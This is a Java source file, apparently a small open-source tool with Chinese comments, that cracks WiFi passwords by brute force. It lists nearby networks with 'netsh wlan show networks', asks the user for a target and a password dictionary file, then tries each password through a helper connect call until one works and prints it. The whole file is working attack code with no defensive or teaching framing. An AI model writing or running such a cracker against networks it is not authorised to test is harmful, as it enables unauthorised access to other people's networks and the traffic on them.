import util.CmdUtils;
import util.WiFiUtils;

import java.io.*;
import java.util.List;
import java.util.Map;
import java.util.Scanner;

/**
 * @author weirdo-world
 */
public class WifiMain {

    public static void main(String[] args) throws IOException {
        List<String> wifiList;
        // 查询所有WiFi
        wifiList = CmdUtils.execute("netsh wlan show networks mode=bssid", null);
        Map<String, String> mapName = WiFiUtils.getWifiName(wifiList);
        // 输入要连接的WiFi名称
        System.out.println("请输入要连接的WiFi的序号，以回车键确认");
        Scanner scanner = new Scanner(System.in);
        String name = mapName.get(scanner.nextLine());

        // 输入密码字典文件路径
        System.out.println("请输入密码字典路径，例如：D:\\password\\pwd01.txt");
        Scanner sc = new Scanner(System.in);
        String fileName=sc.nextLine();
        scanner.close();
        sc.close();
        // 开始循环密码进行连接
        try {
            FileReader fileReader=new FileReader(fileName);
            BufferedReader br=new BufferedReader(fileReader);
            String pwd;
            int count=1;
            while ((pwd=br.readLine())!=null){
//                System.out.println("第"+count+"次连接，"+"连接名称为："+name+" 密码为："+pwd);
                // 连接WiFi
                Boolean b = CmdUtils.connectWifi(name, pwd);
//                System.out.println("第七步");
                if (b) {
                    System.out.println("连接成功：名称=" + name + "密码=" + pwd);
                    return;
                } else {
                    System.out.println("连接失败！");
                    count++;
                }
            }
            fileReader.close();
            br.close();
        } catch (IOException e) {
            e.printStackTrace();
        }



    }
}
